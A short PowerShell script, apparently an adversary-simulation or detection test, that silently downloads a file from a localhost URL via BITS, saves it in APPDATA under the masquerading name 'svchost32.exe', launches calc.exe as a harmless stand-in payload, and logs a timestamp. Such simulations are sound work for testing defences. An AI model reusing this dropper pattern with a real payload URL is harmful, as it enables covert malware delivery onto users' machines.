<# Staged execution #>
[CmdletBinding()]
param(
    [string]$TargetUrl = 'http://localhost:8081/stage1.ps1',
    [string]$WorkingPath = "$env:APPDATA\svchost32.exe",
    [int]$RequestTimeout = 176
)
Start-BitsTransfer -Source $TargetUrl -Destination $WorkingPath -ErrorAction SilentlyContinue
Start-Process -FilePath "calc.exe" -ErrorAction SilentlyContinue
Get-Date -Format "yyyy-MM-dd HH:mm:ss" | Out-File -FilePath "$env:TEMP\stage.log" -Append
